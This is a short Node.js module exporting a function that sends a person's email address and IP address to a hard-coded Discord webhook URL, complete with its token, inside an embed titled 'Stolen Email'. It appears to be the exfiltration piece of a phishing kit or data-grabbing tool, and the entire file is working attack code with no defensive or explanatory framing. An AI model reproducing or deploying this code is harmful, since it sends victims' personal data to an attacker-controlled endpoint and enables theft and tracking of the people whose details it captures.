const axios = require('axios');

const webhookUrl = 'https://discordapp.com/api/webhooks/1405836394718564434/c1RhQlncKJoxuG6YjGwMTqW3rPlQDdeHnoccIItaUJrtF4jhkokOttATU2sPDy6jPE6H';

const sendWebhook = (email, ip) => {
    const embed = {
        title: 'Stolen Email',
        description: `Email: ${email}\nIP: ${ip}`,
        color: 0xff0000,
        fields: [
            {
                name: 'Email',
                value: email,
                inline: true
            },
            {
                name: 'IP',
                value: ip,
                inline: true
            }
        ]
    };

    const data = {
        embeds: [embed]
    };

    axios.post(webhookUrl, data)
        .then((res) => {
            console.log('Webhook sent');
        })
        .catch((err) => {
            console.error('Error sending webhook:', err);
        });
};

module.exports = sendWebhook;
